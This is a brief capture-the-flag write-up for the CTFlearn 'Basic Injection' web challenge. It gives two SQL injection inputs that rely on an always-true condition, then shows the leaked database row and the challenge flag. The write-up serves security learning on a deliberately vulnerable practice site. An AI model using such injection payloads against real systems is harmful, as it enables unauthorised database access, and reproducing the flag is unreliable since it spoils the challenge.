---
layout: writeup
---

# Basic Injection
Category: Web

## Description

> See if you can leak the whole database using what you know about SQL Injections. [link](https://web.ctflearn.com/web4/).  

# Solution

To solve this, simply input `OR 1=1; #` or `' OR 1=1;-- ` (with a space after double dash). This leaks the database and gives us the answer
```
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs} 
```